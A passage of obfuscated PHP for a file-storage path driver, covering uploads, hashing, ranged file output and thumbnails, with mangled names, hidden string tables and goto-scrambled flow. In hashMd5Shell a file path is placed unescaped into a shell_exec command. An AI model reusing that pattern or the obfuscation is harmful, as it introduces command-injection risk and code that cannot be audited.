$eğñ‘à„»¯[$bµ”ĞÙæ¸ò[78]]++; $eğñ‘à„»¯[$bµ”ĞÙæ¸ò[77]] += $BèóâÍëò–[$bµ”ĞÙæ¸ò[77]]; } } } public function fileSubstr($E¿øå¤¹‰¹, $dÚ›¬íÎ±, $CÒ—ØÉĞİ) { } public function listAll($ešåã–Æ) { } public function upload($e½å¥ŒÎœ, $EĞ…¥Ø„ëª, $EÃÄª‚ªÖÈ = false, $Fä†ØÕÔË = REPEAT_REPLACE) { } public function uploadFileByID($f³ËÀØç˜Í, $eÕù¼‡´Çá, $dµÓóï½Öô) { } public function uploadFileByPath($eõ÷´ÀÁ¦§, $CÙ¨éŒáâø, $F„½Âå¾’Ì = array()) { } public function isUploadServer() { $D ×‰†•Ÿ =& $_SERVER[Äº¡•ô™Ÿ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $D ×‰†•Ÿ[83]) { return !0; } return $GLOBALS[$D ×‰†•Ÿ[6]][$D ×‰†•Ÿ[84]][$D ×‰†•Ÿ[85]]; } public function isFileOutServer() { $C‹¢†ŸÂŸ =& $_SERVER[Äº¡•ô™Ÿ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $C‹¢†ŸÂŸ[83]) { return !0; } return $GLOBALS[$C‹¢†ŸÂŸ[6]][$C‹¢†ŸÂŸ[84]][$C‹¢†ŸÂŸ[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($Bù˜îõêãÄ) { $Bå–ÚÛöç… =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->isCdnHost()) { return $Bù˜îõêãÄ; } return str_replace(trim(get_url_root($Bù˜îõêãÄ), $Bå–ÚÛöç…[8]), trim($this->cdnHost, $Bå–ÚÛöç…[8]), $Bù˜îõêãÄ); } public function uploadLink($E™ìéÎÈ¾ , $A™ÜÜó† = 0) { goto aÖè©‰ë”º; B¤·ÕÙã™: if ($EãÄ˜ƒà·–) { $EãÄ˜ƒà·–[$E‘ÃÆ÷ö²Á[89]] = $E™ìéÎÈ¾ ; $EãÄ˜ƒà·–[$E‘ÃÆ÷ö²Á[90]] = $bÑ¥·‰Ş®½; } return $EãÄ˜ƒà·–; goto B½ÑÛ·ç–; aÖè©‰ë”º: $E‘ÃÆ÷ö²Á =& $_SERVER[Äº¡•ô™Ÿ]; if ($this->isUploadServer()) { return; } $bÑ¥·‰Ş®½ = $this->getType(); goto BïÓÀâ¨ˆ‰; BïÓÀâ¨ˆ‰: if (!in_array($bÑ¥·‰Ş®½, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $DŒ´áÃõ‚ = 1024 * 1024 * 10; goto aŒ»µ „‘¯; aŒ»µ „‘¯: $cÌÊâ—¤ç = $A™ÜÜó† <= $DŒ´áÃõ‚ ? $E‘ÃÆ÷ö²Á[87] : $E‘ÃÆ÷ö²Á[88]; $c§¯¬è½Œã = (!$A™ÜÜó† ? 1 : ceil($A™ÜÜó† / pow(1024, 3))) * 3600 * 4; $EãÄ˜ƒà·– = $this->{$cÌÊâ—¤ç}($E™ìéÎÈ¾ , $c§¯¬è½Œã); goto B¤·ÕÙã™; B½ÑÛ·ç–: } public function uploadFormData($CØõèÓë›Û, $dõÍ™Ø”ÅÕ = 3600) { } public function multiUploadFormData($DùØÆ¿­£, $C£ÄÔ‚ó… = 3600) { } public function osChunkSize() { $e…É¡ˆ§¨ =& $_SERVER[Äº¡•ô™Ÿ]; $C¿é–¯ëâ = (double) $GLOBALS[$e…É¡ˆ§¨[6]][$e…É¡ˆ§¨[84]][$e…É¡ˆ§¨[91]][$e…É¡ˆ§¨[92]]; if (!$C¿é–¯ëâ) { $C¿é–¯ëâ = 1024 * 84 * 10; } return $C¿é–¯ëâ; } public function download($bËœ‹Í±èí, $c‡Öø©Ê‡) { } public function ext($aµÓàÉØñ) { $CÁâª„¿– =& $_SERVER[Äº¡•ô™Ÿ]; if (strpos($aµÓàÉØñ, $CÁâª„¿–[8]) === -1) { $F‹òÈŠĞ«¹ = $aµÓàÉØñ; } else { $F‹òÈŠĞ«¹ = $this->pathThis($aµÓàÉØñ); } $aÍ†Ÿ¶µ³‚ = $CÁâª„¿–[33]; if (strstr($F‹òÈŠĞ«¹, $CÁâª„¿–[93])) { $aÍ†Ÿ¶µ³‚ = substr($F‹òÈŠĞ«¹, strrpos($F‹òÈŠĞ«¹, $CÁâª„¿–[93]) + 1); $aÍ†Ÿ¶µ³‚ = strtolower($aÍ†Ÿ¶µ³‚); } if (strlen($aÍ†Ÿ¶µ³‚) > 3 && preg_match($CÁâª„¿–[94], $aÍ†Ÿ¶µ³‚, $cƒŞÇÒë¦)) { $aÍ†Ÿ¶µ³‚ = $CÁâª„¿–[33]; } return $aÍ†Ÿ¶µ³‚; } public function pathThis($fÏ®Ë’³Š•) { $b‹Û­¾ ¢ =& $_SERVER[Äº¡•ô™Ÿ]; $fÏ®Ë’³Š• = str_replace($b‹Û­¾ ¢[95], $b‹Û­¾ ¢[8], rtrim($fÏ®Ë’³Š•, $b‹Û­¾ ¢[8])); $b¯–ê‚¸ = strrpos($fÏ®Ë’³Š•, $b‹Û­¾ ¢[8]); if ($b¯–ê‚¸ === !1) { return $fÏ®Ë’³Š•; } return substr($fÏ®Ë’³Š•, $b¯–ê‚¸ + 1); } public function pathFather($fƒ–’°İ‚™) { $AÛ„õ†«’Ì =& $_SERVER[Äº¡•ô™Ÿ]; $fƒ–’°İ‚™ = str_replace($AÛ„õ†«’Ì[95], $AÛ„õ†«’Ì[8], rtrim($fƒ–’°İ‚™, $AÛ„õ†«’Ì[8])); $aÂºáõÑƒô = strrpos($fƒ–’°İ‚™, $AÛ„õ†«’Ì[8]); if ($aÂºáõÑƒô === !1) { return $AÛ„õ†«’Ì[33]; } return substr($fƒ–’°İ‚™, 0, $aÂºáõÑƒô + 1); } public function hashSimple($B»÷¡éäÃÚ) { goto a‘é‡ë·Óø; aÔ²ƒäÃ™: $FŞ°Ä¹è = intval($AŒÇÒÑ¡Ò / $cÑè“½®É¿); $D–åà…Ÿ = $FçÏ¬Ğ¬³ï[33]; for ($dÅòÙÍâÁñ = 0; $dÅòÙÍâÁñ < $cÑè“½®É¿; $dÅòÙÍâÁñ++) { $D–åà…Ÿ .= $this->fileSubstr($B»÷¡éäÃÚ, $FŞ°Ä¹è * $dÅòÙÍâÁñ, $B›ğ‰½í); } goto dÎ»‘’ºî¥; dÎ»‘’ºî¥: $D–åà…Ÿ .= $this->fileSubstr($B»÷¡éäÃÚ, $AŒÇÒÑ¡Ò - $B›ğ‰½í, $B›ğ‰½í); return md5($D–åà…Ÿ) . $AŒÇÒÑ¡Ò; goto E‚ÄÑæÄÑ§; Eƒ·‡ÅŒ¦Ñ: $B›ğ‰½í = 200; $cÑè“½®É¿ = 50; if ($AŒÇÒÑ¡Ò <= $B›ğ‰½í * $cÑè“½®É¿) { return $this->hashMd5($B»÷¡éäÃÚ) . $AŒÇÒÑ¡Ò; } goto aÔ²ƒäÃ™; a‘é‡ë·Óø: $FçÏ¬Ğ¬³ï =& $_SERVER[Äº¡•ô™Ÿ]; if (!$B»÷¡éäÃÚ) { return md5($FçÏ¬Ğ¬³ï[33]); } $AŒÇÒÑ¡Ò = $this->size($B»÷¡éäÃÚ); goto Eƒ·‡ÅŒ¦Ñ; E‚ÄÑæÄÑ§: } public static $md5Cache = array(); public function hashMd5($fèŒÉá×Æ‰) { $fèŒÉá×Æ‰ = $this->iconvSystem($fèŒÉá×Æ‰); if (isset(self::$md5Cache[$fèŒÉá×Æ‰])) { return self::$md5Cache[$fèŒÉá×Æ‰]; } self::$md5Cache[$fèŒÉá×Æ‰] = $this->hashMd5Shell($fèŒÉá×Æ‰); if (!self::$md5Cache[$fèŒÉá×Æ‰]) { self::$md5Cache[$fèŒÉá×Æ‰] = @md5_file($fèŒÉá×Æ‰); } return self::$md5Cache[$fèŒÉá×Æ‰]; } private function hashMd5Shell($dª‰¯ÉÏÒ) { goto D›ëóªÈ²Ù; Aùô ’ÆŞ¾: $bŠ÷ŠŠŸÄ = shell_exec($cÆÍ¬›¸´Ÿ . "\x20\x22{$dª‰¯ÉÏÒ}\42"); return substr($bŠ÷ŠŠŸÄ, 0, 32); goto EÈ‡ˆ®Ó½õ; D›ëóªÈ²Ù: $bçÁç¼î„ =& $_SERVER[Äº¡•ô™Ÿ]; if (!function_exists($bçÁç¼î„[96])) { return !1; } $d­ò»“èá = array($bçÁç¼î„[97], $bçÁç¼î„[98]); goto D¦’ßÕ³¨Ğ; D¦’ßÕ³¨Ğ: $cÆÍ¬›¸´Ÿ = Cache::get($bçÁç¼î„[99]); if (!$cÆÍ¬›¸´Ÿ) { $f©ÈÒœ£¯ = BASIC_PATH . $bçÁç¼î„[100]; $aáÍĞ¤¬ÒÛ = md5_file($f©ÈÒœ£¯); $cÆÍ¬›¸´Ÿ = $bçÁç¼î„[101]; foreach ($d­ò»“èá as $A‰œŠíóÄ‚) { $bŠ÷ŠŠŸÄ = shell_exec($A‰œŠíóÄ‚ . "\40\x22{$f©ÈÒœ£¯}\x22"); if ($bŠ÷ŠŠŸÄ && substr(trim($bŠ÷ŠŠŸÄ), 0, 32) == $aáÍĞ¤¬ÒÛ) { $cÆÍ¬›¸´Ÿ = $A‰œŠíóÄ‚; break; } } Cache::set($bçÁç¼î„[99], $cÆÍ¬›¸´Ÿ, 3600); } if ($cÆÍ¬›¸´Ÿ == $bçÁç¼î„[101]) { return !1; } goto Aùô ’ÆŞ¾; EÈ‡ˆ®Ó½õ: } public function link($cñÅÉÎ–„ô) { return $cñÅÉÎ–„ô; } public function fileOut($Bô¥óß‚ßÂ, $d¶Šî‚ˆ‡ù = false, $BÙ‘êéøç¸ = false, $bô¦ßß¿‡™ = '') { goto F—°©²âì; e‘™ğÄñæº: header($BİÊïÙ›é[121]); header($BİÊïÙ›é[122] . $ağ„í Êƒ¿); header($BİÊïÙ›é[123] . gmdate($BİÊïÙ›é[106], time() + 3600 * 24 * 30) . $BİÊïÙ›é[124]); goto BŠƒÁ¼…÷; D¿×ˆ•Ø±œ: $d¶õ‡ºÆˆ = rawurlencode($f¹ğùœ±‹ç); $d¶õ‡ºÆˆ = $BİÊïÙ›é[113] . $d¶õ‡ºÆˆ . $BİÊïÙ›é[117] . $d¶õ‡ºÆˆ; if ($d¶Šî‚ˆ‡ù) { header($BİÊïÙ›é[118]); header($BİÊïÙ›é[119] . $d¶õ‡ºÆˆ); } else { header($BİÊïÙ›é[120] . $d¶õ‡ºÆˆ); } goto e‘™ğÄñæº; fÎØëã³: header($BİÊïÙ›é[135] . $Eƒâ­øÈˆÉ); header($BİÊïÙ›é[136]); if (!$d¶Šî‚ˆ‡ù && $Aã‘Œ©Ñ¬ == $BİÊïÙ›é[137]) { if ($Eƒâ­øÈˆÉ > 1024 * 1024 * 5) { die; } $CñšÎ©éù£ = $this->getContent($Bô¥óß‚ßÂ); $CñšÎ©éù£ = Html::removeXXS($CñšÎ©éù£); echo $CñšÎ©éù£; die; } goto A±¼²”ÔÉÂ; cÁ•Ê‘ãô: header($BİÊïÙ›é[132] . $e¿’ËæÖé . $BİÊïÙ›é[124]); header($BİÊïÙ›é[133] . $f¹ğùœ±‹ç); header($BİÊïÙ›é[134]); goto fÎØëã³; A±¼²”ÔÉÂ: $EÊÅ¾ñËöù = strtolower($_SERVER[$BİÊïÙ›é[138]]); if ($A©ã‰È½” && $EÊÅ¾ñËöù && $c™šŠà›Ä•) { if (strstr($EÊÅ¾ñËöù, $BİÊïÙ›é[139])) { header($BİÊïÙ›é[140] . $Bô¥óß‚ßÂ); } else { if (strstr($EÊÅ¾ñËöù, $BİÊïÙ›é[141])) { header($BİÊïÙ›é[142] . $Bô¥óß‚ßÂ); } else { if (strstr($EÊÅ¾ñËöù, $BİÊïÙ›é[143])) { header($BİÊïÙ›é[144] . $Bô¥óß‚ßÂ); } } } if ($Cô‰¾Œ¡°) { header($BİÊïÙ›é[145] . $Cô‰¾Œ¡°); } return; } if (isset($_SERVER[$BİÊïÙ›é[146]])) { if (preg_match($BİÊïÙ›é[147], $_SERVER[$BİÊïÙ›é[146]], $aÆó’†¸¨)) { $Cäå°…… = intval($aÆó’†¸¨[1]); if (!empty($aÆó’†¸¨[2])) { $C‘ğ®ÅÔ‹‘ = intval($aÆó’†¸¨[2]); } } header($BİÊïÙ›é[148]); header("\x43\x6f\156\164\145\156\x74\x2d\122\141\x6e\x67\x65\x3a\x20\142\171\x74\145\x73\x20{$Cäå°……}\x2d{$C‘ğ®ÅÔ‹‘}\x2f" . $Eƒâ­øÈˆÉ); } else { header($BİÊïÙ›é[149]); } goto EŞÛóÌ¡Ûœ; F—°©²âì: $BİÊïÙ›é =& $_SERVER[Äº¡•ô™Ÿ]; $this->cacheMethod(null, null); if (!$Bô¥óß‚ßÂ || !$this->exist($Bô¥óß‚ßÂ)) { show_json(LNG($BİÊïÙ›é[102]), !1, $BÙ‘êéøç¸); } goto Fá‰˜—Í«‹; aè”õÃß¯Ñ: if (in_array($Aã‘Œ©Ñ¬, array($BİÊïÙ›é[108], $BİÊïÙ›é[109], $BİÊïÙ›é[110], $BİÊïÙ›é[111]))) { $Aã‘Œ©Ñ¬ = $BİÊïÙ›é[112]; } if (!$bô¦ßß¿‡™) { $bô¦ßß¿‡™ = md5($e¿’ËæÖé . $this->hashSimple($Bô¥óß‚ßÂ)); } $bô¦ßß¿‡™ = $BİÊïÙ›é[113] . $bô¦ßß¿‡™ . $BİÊïÙ›é[113]; goto bÂ¦™Ò¥Û®; bÂ¦™Ò¥Û®: $ağ„í Êƒ¿ = get_file_mime($Aã‘Œ©Ñ¬); if (strstr($ağ„í Êƒ¿, $BİÊïÙ›é[114])) { $ağ„í Êƒ¿ = $ağ„í Êƒ¿ . $BİÊïÙ›é[115]; } if ($d¶Šî‚ˆ‡ù === !1 && !mime_support($ağ„í Êƒ¿)) { $d¶Šî‚ˆ‡ù = !0; $ağ„í Êƒ¿ = $BİÊïÙ›é[116]; } goto D¿×ˆ•Ø±œ; dô¯Õ©Á³è: if (isset($_SERVER[$BİÊïÙ›é[128]]) && strtotime($_SERVER[$BİÊïÙ›é[128]]) == $B˜†Áß¹ö¡[$BİÊïÙ›é[107]]) { header($BİÊïÙ›é[129], !0, 304); die; } if (isset($_SERVER[$BİÊïÙ›é[130]]) && $_SERVER[$BİÊïÙ›é[130]] == $bô¦ßß¿‡™) { header($BİÊïÙ›é[131] . $bô¦ßß¿‡™, !0, 304); die; } header($BİÊïÙ›é[131] . $bô¦ßß¿‡™); goto cÁ•Ê‘ãô; BŠƒÁ¼…÷: header($BİÊïÙ›é[125]); header($BİÊïÙ›é[126]); header($BİÊïÙ›é[127]); goto dô¯Õ©Á³è; aË¥™‘Ë§¥: $Eƒâ­øÈˆÉ = $B˜†Áß¹ö¡[$BİÊïÙ›é[77]]; $e¿’ËæÖé = gmdate($BİÊïÙ›é[106], $B˜†Áß¹ö¡[$BİÊïÙ›é[107]]); $f¹ğùœ±‹ç = $BÙ‘êéøç¸ ? $BÙ‘êéøç¸ : $this->iconvApp($B˜†Áß¹ö¡[$BİÊïÙ›é[28]]); goto BÎì¥‚é²; d¤¹¶½—ˆ¤: @ob_end_clean(); set_timeout(); $B˜†Áß¹ö¡ = $this->infoFull($Bô¥óß‚ßÂ); goto aË¥™‘Ë§¥; bšÆÕë†¸Ø: $AÅÅ°ó²é– = 0; if ($Cô‰¾Œ¡°) { $AÅÅ°ó²é– = intval(1000 * 1000 * ($dŞ“ÌšéˆŠ / $Cô‰¾Œ¡°)); } while ($Cäå°…… <= $C‘ğ®ÅÔ‹‘) { $dŸÎİ¿ã£Ü = timeFloat(); check_abort(); $D—…º±Ğ‹š = $C‘ğ®ÅÔ‹‘ - $Cäå°…… + 1; if ($D—…º±Ğ‹š <= $dŞ“ÌšéˆŠ) { $dŞ“ÌšéˆŠ = $D—…º±Ğ‹š; } echo $this->fileSubstr($Bô¥óß‚ßÂ, $Cäå°……, $dŞ“ÌšéˆŠ); $Cäå°…… += $dŞ“ÌšéˆŠ; if ($dŞ“ÌšéˆŠ == $D—…º±Ğ‹š) { $Cäå°…… = $C‘ğ®ÅÔ‹‘ + 1; } if ($AÅÅ°ó²é–) { $aàô¡Ò÷Ÿ = intval(1000 * 1000 * (timeFloat() - $dŸÎİ¿ã£Ü)); $cà¿ñæªìí = $AÅÅ°ó²é– - $aàô¡Ò÷Ÿ; if ($cà¿ñæªìí > 5) { usleep($cà¿ñæªìí); } } } goto Då•ù¦—³ù; EŞÛóÌ¡Ûœ: header($BİÊïÙ›é[150] . ($C‘ğ®ÅÔ‹‘ - $Cäå°…… + 1)); if ($_SERVER[$BİÊïÙ›é[151]] == $BİÊïÙ›é[152]) { return; } $dŞ“ÌšéˆŠ = 1024 * 100; goto bšÆÕë†¸Ø; BÎì¥‚é²: $Cäå°…… = 0; $C‘ğ®ÅÔ‹‘ = $Eƒâ­øÈˆÉ - 1; $Aã‘Œ©Ñ¬ = $this->ext($f¹ğùœ±‹ç); goto aè”õÃß¯Ñ; Fá‰˜—Í«‹: $A©ã‰È½” = $this->getType() == $BİÊïÙ›é[103]; $c™šŠà›Ä• = $GLOBALS[$BİÊïÙ›é[6]][$BİÊïÙ›é[84]][$BİÊïÙ›é[91]][$BİÊïÙ›é[104]]; $Cô‰¾Œ¡° = (double) $GLOBALS[$BİÊïÙ›é[6]][$BİÊïÙ›é[84]][$BİÊïÙ›é[91]][$BİÊïÙ›é[105]] * 1024 * 1024; goto d¤¹¶½—ˆ¤; Då•ù¦—³ù: } public function fileOutServer($EÍî…†’½×, $CãÅ¡Š©Á = false, $cœºÍºŠÄÈ = false, $AÙá…’³ß = '') { $this->fileOut($EÍî…†’½×, $CãÅ¡Š©Á, $cœºÍºŠÄÈ, $AÙá…’³ß); } public function fileOutLink($a²Ë·ïÑã) { header($_SERVER[Äº¡•ô™Ÿ][153] . $a²Ë·ïÑã); die; } public function cacheMethod($A¸«ä‹Æå”, $d”ùÑêÔÚ“) { goto dË¸®ËŒØ”; AºÀ»ß‹ÃÕ: if (!is_null($e‰ÊÔçË¨ƒ)) { return $e‰ÊÔçË¨ƒ; } $e‰ÊÔçË¨ƒ = $this->{$A¸«ä‹Æå”}($d”ùÑêÔÚ“); $Dõ‚“‰‰ï[$E“† µ±À”] = $e‰ÊÔçË¨ƒ; goto D¢õ¼Ÿ½¦”; D¢õ¼Ÿ½¦”: return $e‰ÊÔçË¨ƒ; goto D“â±Õ‡¯œ; aèëçœÎ˜´: if (is_null($A¸«ä‹Æå”)) { $Dõ‚“‰‰ï = array(); return; } if (is_null($d”ùÑêÔÚ“)) { unset($Dõ‚“‰‰ï[$E“† µ±À”]); return; } $e‰ÊÔçË¨ƒ = isset($Dõ‚“‰‰ï[$E“† µ±À”]) ? $Dõ‚“‰‰ï[$E“† µ±À”] : null; goto AºÀ»ß‹ÃÕ; dË¸®ËŒØ”: $DÖË÷á·­ =& $_SERVER[Äº¡•ô™Ÿ]; static $Dõ‚“‰‰ï = array(); $E“† µ±À” = $DÖË÷á·­[154] . $A¸«ä‹Æå” . $DÖË÷á·­[155] . rtrim($d”ùÑêÔÚ“, $DÖË÷á·­[8]); goto aèëçœÎ˜´; D“â±Õ‡¯œ: } public function fileOutImage($E‡ÆòÆñ, $c©ô¥„çŠ = 250) { goto C®ÅåéÌ†; c´³¦·é‰Œ: if ($DÊ¥ ’Ä«­[$F±°‡•º‚Å[77]] <= 1024 * 50 || !function_exists($F±°‡•º‚Å[156]) || $DÊ¥ ’Ä«­[$F±°‡•º‚Å[157]] == $F±°‡•º‚Å[158]) { return $this->fileOut($E‡ÆòÆñ); } if (isset($DÊ¥ ’Ä«­[$F±°‡•º‚Å[159]][$F±°‡•º‚Å[160]])) { $DæÅ¸ÃˆÇè = $DÊ¥ ’Ä«­[$F±°‡•º‚Å[159]][$F±°‡•º‚Å[160]]; } else { if (isset($DÊ¥ ’Ä«­[$F±°‡•º‚Å[159]][$F±°‡•º‚Å[161]])) { $DæÅ¸ÃˆÇè = $DÊ¥ ’Ä«­[$F±°‡•º‚Å[159]][$F±°‡•º‚Å[161]]; } else { $DæÅ¸ÃˆÇè = md5("{$DÊ¥ ’Ä«­[$F±°‡•º‚Å[28]]}\x5f{$DÊ¥ ’Ä«­[$F±°‡•º‚Å[75]]}\137{$DÊ¥ ’Ä«­[$F±°‡•º‚Å[77]]}"); } } $fãÅğ™ˆÑâ = "{$DæÅ¸ÃˆÇè}\x5f{$c©ô¥„çŠ}\x2e\x70\x6e\147"; goto F½¥…á©±á; E±±ªµ×éŒ: $f›”‡‰¼ğ• = DATA_THUMB . $fãÅğ™ˆÑâ; if (!@file_exists($f›”‡‰¼ğ•)) { $D¨¨ğì”±Ş = TEMP_FILES; if (!is_dir($D¨¨ğì”±Ş)) { mk_dir($D¨¨ğì”±Ş); } $FîºÄíÎÓ´ = $D¨¨ğì”±Ş . $DæÅ¸ÃˆÇè . $F±°‡•º‚Å[93] . $DÊ¥ ’Ä«­[$F±°‡•º‚Å[157]]; if (!@file_exists($FîºÄíÎÓ´)) { $FîºÄíÎÓ´ = $this->download($E‡ÆòÆñ, $FîºÄíÎÓ´); } $E‹îÎïéø = new ImageThumb($FîºÄíÎÓ´, $F±°‡•º‚Å[164]); $E‹îÎïéø->prorate($f›”‡‰¼ğ•, $c©ô¥„çŠ, $c©ô¥„çŠ * 10); } if (!file_exists($f›”‡‰¼ğ•) || filesize($f›”‡‰¼ğ•) < 100) { return @file_exists($FîºÄíÎÓ´) ? IO::fileOut($FîºÄíÎÓ´) : $this->fileOut($E‡ÆòÆñ); } goto DÛ†•Êí×Æ; F½¥…á©±á: if (!($BË‚ÓËÁãç = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $F±°‡•º‚Å[162]))) { $c£ö‚ÃŠ’¤ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $F±°‡•º‚Å[163]); } else { $c£ö‚ÃŠ’¤ = KodIO::make($BË‚ÓËÁãç); } if ($BË‚ÓËÁãç = IO::fileNameExist($c£ö‚ÃŠ’¤, $fãÅğ™ˆÑâ)) { $f›”‡‰¼ğ• = KodIO::make($BË‚ÓËÁãç); return IO::fileOut($f›”‡‰¼ğ•); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto E±±ªµ×éŒ; DÛ†•Êí×Æ: if (!($aØâõ‡¯õÁ = IO::move($f›”‡‰¼ğ•, $c£ö‚ÃŠ’¤))) { return IO::fileOut($f›”‡‰¼ğ•); } del_file($f›”‡‰¼ğ•); IO::fileOut($aØâõ‡¯õÁ); goto a¼‘ê‹Ñèœ; C®ÅåéÌ†: $F±°‡•º‚Å =& $_SERVER[Äº¡•ô™Ÿ]; if (substr($E‡ÆòÆñ, 0, 4) == $F±°‡•º‚Å[143]) { $this->fileOutLink($E‡ÆòÆñ); } $DÊ¥ ’Ä«­ = $this->info($E‡ÆòÆñ); goto c´³¦·é‰Œ; a¼‘ê‹Ñèœ: } public function fileOutImageServer($eªÛ†ÕîãÙ, $dÈöÃ”²áÁ = 250) { $this->fileOutImage($eªÛ†ÕîãÙ, $dÈöÃ”²áÁ); } public function fileNameAuto($fö¼Í»ÜÛÂ, $CåŒ©¹·ë£, $d”í‚Ÿ½› = REPEAT_RENAME, $F¾©›¿Ê– = false) { goto f¤«º¥É¨˜; f‚ «Åš‡ë: while ($this->exist(rtrim($fö¼Í»ÜÛÂ, $d¯ƒ‚íâ˜[8]) . $d¯ƒ‚íâ˜[8] . $eº¡ğÔÅÚ“)) { $eº¡ğÔÅÚ“ = $aÅ™¹Š…ò” . "\50{$b›‹Ñ¬¹ßœ}\x29{$AÅÕ™Ë™Ä}"; $b›‹Ñ¬¹ßœ++; } return $eº¡ğÔÅÚ“; goto F©—´³ëÇ; e®´«Ï‹Øø: if ($d”í‚Ÿ½› == REPEAT_SKIP) { return !1; } $AÅÕ™Ë™Ä = $d¯ƒ‚íâ˜[93] . get_path_ext($CåŒ©¹·ë£); $AÅÕ™Ë™Ä = $AÅÕ™Ë™Ä == $d¯ƒ‚íâ˜[93] || $F¾©›¿Ê– ? $d¯ƒ‚íâ˜[33] : $AÅÕ™Ë™Ä; goto eŒÚ‡Œëò; eŒÚ‡Œëò: $b›‹Ñ¬¹ßœ = 1; $aÅ™¹Š…ò” = substr($CåŒ©¹·ë£, 0, strlen($CåŒ©¹·ë£) - strlen($AÅÕ™Ë™Ä)); $eº¡ğÔÅÚ“ = $aÅ™¹Š…ò” . "\50{$b›‹Ñ¬¹ßœ}\x29{$AÅÕ™Ë™Ä}"; goto f‚ «Åš‡ë; f¤«º¥É¨˜: $d¯ƒ‚íâ˜ =& $_SERVER[Äº¡•ô™Ÿ]; $B¬šãÍ¬©§ = $fö¼Í»ÜÛÂ === $d¯ƒ‚íâ˜[33] ? $CåŒ©¹·ë£ : rtrim($fö¼Í»ÜÛÂ, $d¯ƒ‚íâ˜[8]) . $d¯ƒ‚íâ˜[8] . $CåŒ©¹·ë£; if ($d”í‚Ÿ½› == REPEAT_REPLACE || !$this->exist($B¬šãÍ¬©§) || $F¾©›¿Ê– && $d”í‚Ÿ½› != REPEAT_RENAME_FOLDER) { return $CåŒ©¹·ë£; } goto e®´«Ï‹Øø; F©—´³ëÇ: } public function listAllFiles($B›ĞÉ·”›Ö, $E¡ã„ÌªŸÔ, $aâ³Ç·‘šÙ = array()) { goto aµÃ”ó‚; E¾‘äµá„Í: foreach (array_unique($CÆß©æêİŸ) as $BÎÁœ’ˆ) { $dñ‰¦Ï„Æ‹ = array($e‡ÎôŒ“ˆ[75] => $this->getPathOuter($e‡ÎôŒ“ˆ[8] . $B›ĞÉ·”›Ö . $e‡ÎôŒ“ˆ[8] . $BÎÁœ’ˆ), $e‡ÎôŒ“ˆ[76] => 1, $e‡ÎôŒ“ˆ[77] => 0); if (substr($BÎÁœ’ˆ, -1) != $e‡ÎôŒ“ˆ[8]) { $dñ‰¦Ï„Æ‹[$e‡ÎôŒ“ˆ[76]] = 0; $bá‡åš¢Ì = $this->getPath($B›ĞÉ·”›Ö . $e‡ÎôŒ“ˆ[8] . $BÎÁœ’ˆ); $dñ‰¦Ï„Æ‹[$e‡ÎôŒ“ˆ[77]] = isset($aâ³Ç·‘šÙ[$bá‡åš¢Ì]) ? $aâ³Ç·‘šÙ[$bá‡åš¢Ì] : $this->size($bá‡åš¢Ì); } $bÀ˜óÑÊ§é[] = $dñ‰¦Ï„Æ‹; } return $bÀ˜óÑÊ§é; goto bö—‚áğÉ‰; AĞ¤Ïö²»: $B›ĞÉ·”›Ö = trim($B›ĞÉ·”›Ö, $e‡ÎôŒ“ˆ[8]); foreach ($E¡ã„ÌªŸÔ as $BÎÁœ’ˆ) { $bÃÖ·¥¢õ‹ = ltrim(substr($BÎÁœ’ˆ, strlen($B›ĞÉ·”›Ö)), $e‡ÎôŒ“ˆ[8]); $CÆß©æêİŸ = array_merge($CÆß©æêİŸ, $this->slicePath($bÃÖ·¥¢õ‹)); } $bÀ˜óÑÊ§é = array(); goto E¾‘äµá„Í; aµÃ”ó‚: $e‡ÎôŒ“ˆ =& $_SERVER[Äº¡•ô™Ÿ]; if (empty($E¡ã„ÌªŸÔ)) { return array(); } $CÆß©æêİŸ = array(); goto AĞ¤Ïö²»; bö—‚áğÉ‰: } public function slicePath($EÒë‚­ªĞÁ) { $D°ìáî‚øÆ =& $_SERVER[Äº¡•ô™Ÿ]; $E”›“ªÌôÉ = explode($D°ìáî‚øÆ[8], trim($EÒë‚­ªĞÁ, $D°ìáî‚øÆ[8])); $f¤“ÑÚá´¨ = 0; do { ++$f¤“ÑÚá´¨; $AÆëÎğºÆÃ[] = implode($D°ìáî‚øÆ[8], array_slice($E”›“ªÌôÉ, 0, $f¤“ÑÚá´¨)) . $D°ìáî‚øÆ[8]; } while ($f¤“ÑÚá´¨ < count($E”›“ªÌôÉ)); $AÆëÎğºÆÃ[count($E”›“ªÌôÉ) - 1] = $EÒë‚­ªĞÁ; return $AÆëÎğºÆÃ; } public function getHost() { $F‰ê³ Ò¬ =& $_SERVER[Äº¡•ô™Ÿ]; $DªÕ£Øœî© = parse_url(trim($this->domain, $F‰ê³ Ò¬[8])); $CòÚ”š†¼ø = isset($DªÕ£Øœî©[$F‰ê³ Ò¬[165]]) ? $DªÕ£Øœî©[$F‰ê³ Ò¬[165]] : http_type(); $DéÜ¿íÍï = isset($DªÕ£Øœî©[$F‰ê³ Ò¬[166]]) ? $DªÕ£Øœî©[$F‰ê³ Ò¬[166]] : $DªÕ£Øœî©[$F‰ê³ Ò¬[75]]; if (isset($DªÕ£Øœî©[$F‰ê³ Ò¬[167]])) { $DéÜ¿íÍï .= $F‰ê³ Ò¬[4] . $DªÕ£Øœî©[$F‰ê³ Ò¬[167]]; } return $CòÚ”š†¼ø . $F‰ê³ Ò¬[168] . $DéÜ¿íÍï; } public function pathEncode($Bñ®²çé…) { $Bçò½è¿İ× =& $_SERVER[Äº¡•ô™Ÿ]; return str_replace($Bçò½è¿İ×[169], $Bçò½è¿İ×[8], rawurlencode($Bñ®²çé…)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($CÎª¤÷ù) { set_timeout(); require_once SDK_DIR . $_SERVER[Äº¡•ô™Ÿ][170]; parent::__construct(); $this->_init($CÎª¤÷ù); } public function _init($Eéî‘ƒƒï„) { foreach ($Eéî‘ƒƒï„ as $F—–ÀÍÃ“† => 